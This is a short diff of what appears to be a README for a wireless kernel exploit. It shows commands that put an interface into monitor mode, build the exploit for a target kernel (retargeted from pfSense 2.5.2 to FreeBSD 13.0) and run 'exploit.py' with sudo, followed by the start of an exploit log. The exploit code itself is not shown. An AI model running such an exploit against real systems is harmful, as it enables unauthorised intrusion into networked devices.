@@ -54,11 +54,11 @@ sudo ifconfig wifi0 down && sudo iwconfig wifi0 mode monitor && sudo ifconfig wi
 ```
 # 3 
 ```
-./build.py kernels/pfSense-2.5.2-RELEASE
+./build.py kernels/fbsd-13.0-release
 ```
 # 4
 ```
-sudo ./exploit.py wifi0 kernels/pfSense-2.5.2-RELEASE
+sudo ./exploit.py wifi0 kernels/fbsd-13.0-release
 ```
 # log of the exploit :
 - [+] Phase 1: writing page1
